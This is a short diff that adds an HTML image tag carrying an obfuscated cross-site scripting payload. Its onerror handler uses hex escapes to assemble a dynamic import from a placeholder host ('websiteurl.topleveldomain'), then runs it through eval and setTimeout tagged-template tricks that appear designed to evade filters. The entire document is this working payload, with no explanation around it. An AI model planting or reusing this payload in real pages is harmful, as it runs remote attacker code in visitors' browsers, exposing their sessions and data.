@@ -1,0 +1,3 @@
+<img src="x" onerror='
+    a = "import\x28"; b = "`//websiteurl\x2e"; c = "topleveldomain`\x29"; d = setTimeout; e = eval; f = `${a}${b}${c}`; d`e\x28f\x29`;
+    '></img>
